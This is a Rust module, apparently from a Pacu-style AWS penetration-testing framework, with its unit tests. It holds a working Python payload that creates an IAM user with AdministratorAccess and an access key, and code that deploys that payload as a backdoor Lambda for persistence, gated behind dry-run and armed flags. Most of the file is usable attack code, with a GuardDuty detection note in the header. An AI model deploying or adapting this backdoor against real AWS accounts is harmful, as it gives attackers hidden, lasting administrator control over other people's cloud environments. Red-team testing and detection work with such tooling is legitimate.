//! lambda__backdoor_new_users — plant a backdoor Lambda that creates a new
//! IAM admin user when invoked.
//!
//! Category: PERSIST. Requires --armed for write operations.
//!
//! Concept: Create a Lambda function containing a Python payload that, when
//! invoked, creates a new IAM user and attaches AdministratorAccess. This
//! simulates an attacker planting persistence via a Lambda trigger.
//!
//! Args:
//!   --function-name <name>   name for the backdoor Lambda (default: lancer-backdoor-<random>)
//!   --role-arn <arn>         execution role for the backdoor Lambda (required in exploit mode)
//!   --exploit                actually create the Lambda (requires --armed)
//!
//! Dry-run: print what would be created including the backdoor payload.
//!
//! Detection: lambda:CreateFunction with admin role —
//! GuardDuty Persistence:Lambda/FunctionUpdated

use anyhow::Context as _;
use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

const BACKDOOR_PAYLOAD: &str = r#"import boto3, string, random

def handler(event, context):
    iam = boto3.client('iam')
    username = 'backdoor-' + ''.join(random.choices(string.ascii_lowercase, k=8))
    iam.create_user(UserName=username)
    iam.attach_user_policy(
        UserName=username,
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    iam.create_access_key(UserName=username)
    return {'statusCode': 200, 'body': f'User {username} created'}
"#;

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let function_name: String = {
        let pos = args.iter().position(|&a| a == "--function-name");
        match pos.and_then(|i| args.get(i + 1).copied()) {
            Some(n) => n.to_owned(),
            None => {
                // Generate a random suffix
                let suffix: String = (0..6)
                    .map(|i| (b'a' + (i * 7 + 3) % 26) as char)
                    .collect();
                format!("lancer-backdoor-{suffix}")
            }
        }
    };

    let role_arn: Option<&str> = {
        let pos = args.iter().position(|&a| a == "--role-arn");
        pos.and_then(|i| args.get(i + 1).copied())
    };

    let exploit = args.contains(&"--exploit");

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu.".red().bold()
        );
        return Ok(());
    }

    if exploit && role_arn.is_none() {
        anyhow::bail!("--role-arn <arn> is required when using --exploit");
    }

    println!("{}", "lambda__backdoor_new_users".cyan().bold());
    println!(
        "  Detection: lambda:CreateFunction with admin role — GuardDuty Persistence:Lambda/FunctionUpdated\n"
    );

    // ── Dry-run mode ───────────────────────────────────────────────────────
    if !exploit {
        println!(
            "  {} Would create Lambda function: '{}'",
            "[DRY-RUN]".cyan(),
            function_name.yellow()
        );
        if let Some(role) = role_arn {
            println!("  Execution role ARN: {}", role.yellow());
        } else {
            println!(
                "  {}",
                "Note: --role-arn is required in exploit mode.".yellow()
            );
        }
        println!("\n  Backdoor Python payload that would be deployed:");
        println!("  {}", "─".repeat(60));
        for line in BACKDOOR_PAYLOAD.lines() {
            println!("  {line}");
        }
        println!("  {}", "─".repeat(60));
        println!(
            "\n  When invoked, this function creates a new IAM user with AdministratorAccess."
        );
        println!(
            "\n{}",
            "Run with --exploit --armed --role-arn <arn> to actually create the function.".yellow()
        );
        return Ok(());
    }

    // ── Armed + exploit ───────────────────────────────────────────────────
    let role = role_arn.expect("role_arn validated above");

    println!(
        "  {} Creating backdoor Lambda function '{}'...",
        "[EXEC]".red().bold(),
        function_name.yellow()
    );

    // Build zip of the payload in memory
    let zip_bytes = build_lambda_zip(BACKDOOR_PAYLOAD)
        .context("Failed to build Lambda deployment zip")?;

    let lambda = aws_sdk_lambda::Client::new(&ctx.sdk_config);

    let code = aws_sdk_lambda::types::FunctionCode::builder()
        .zip_file(aws_sdk_lambda::primitives::Blob::new(zip_bytes))
        .build();

    lambda
        .create_function()
        .function_name(&function_name)
        .role(role)
        .runtime(aws_sdk_lambda::types::Runtime::Python311)
        .handler("index.handler")
        .code(code)
        .description("lancer-pacu backdoor function")
        .timeout(30)
        .memory_size(128)
        .send()
        .await
        .context("lambda:CreateFunction failed")?;

    println!(
        "  {} Backdoor Lambda '{}' created successfully.",
        "[OK]".green().bold(),
        function_name.green()
    );
    println!(
        "  {}",
        "When invoked, this function will create a new IAM admin user.".yellow()
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Helper: build a minimal in-memory zip containing index.py
// ---------------------------------------------------------------------------

fn build_lambda_zip(payload: &str) -> anyhow::Result<Vec<u8>> {
    use std::io::Write;

    let mut buf = Vec::new();
    {
        let mut zip = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.start_file("index.py", options)
            .context("zip: start_file failed")?;
        zip.write_all(payload.as_bytes())
            .context("zip: write_all failed")?;
        zip.finish().context("zip: finish failed")?;
    }
    Ok(buf)
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "lambda__backdoor_new_users",
            author: "lancer-pacu",
            category: "PERSIST",
            one_liner: "Create a backdoor Lambda that creates a new IAM admin user on invocation. Requires --armed + --exploit.",
            services: &["Lambda", "IAM"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "lambda__backdoor_new_users");
        assert!(found, "lambda__backdoor_new_users not found in inventory");
    }

    #[test]
    fn module_category_is_persist() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "lambda__backdoor_new_users")
            .expect("lambda__backdoor_new_users not found");
        assert_eq!(m.info.category, "PERSIST");
    }

    #[tokio::test]
    async fn missing_role_arn_in_exploit_mode_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        // We must set armed=true to reach the role_arn check
        let ctx = crate::module::AwsContext {
            dry_run: false,
            armed: true,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &["--exploit", "--function-name", "test-fn"]).await;
        assert!(result.is_err(), "expected error when --role-arn is missing in exploit mode");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--role-arn"),
            "error should mention --role-arn: {msg}"
        );
    }

    #[test]
    fn build_lambda_zip_produces_valid_zip() {
        let result = super::build_lambda_zip("print('hello')");
        assert!(result.is_ok(), "build_lambda_zip should succeed");
        let bytes = result.unwrap();
        // ZIP local file header magic: PK\x03\x04
        assert!(bytes.len() > 4, "zip should not be empty");
        assert_eq!(&bytes[0..2], b"PK", "zip should start with PK magic");
    }

    #[test]
    fn default_function_name_uses_lancer_prefix() {
        // Verify the dry-run path doesn't fail without --function-name
        // We just test the naming logic inline
        let suffix: String = (0..6)
            .map(|i| (b'a' + (i * 7 + 3) % 26) as char)
            .collect();
        let name = format!("lancer-backdoor-{suffix}");
        assert!(name.starts_with("lancer-backdoor-"));
        assert_eq!(name.len(), "lancer-backdoor-".len() + 6);
    }
}
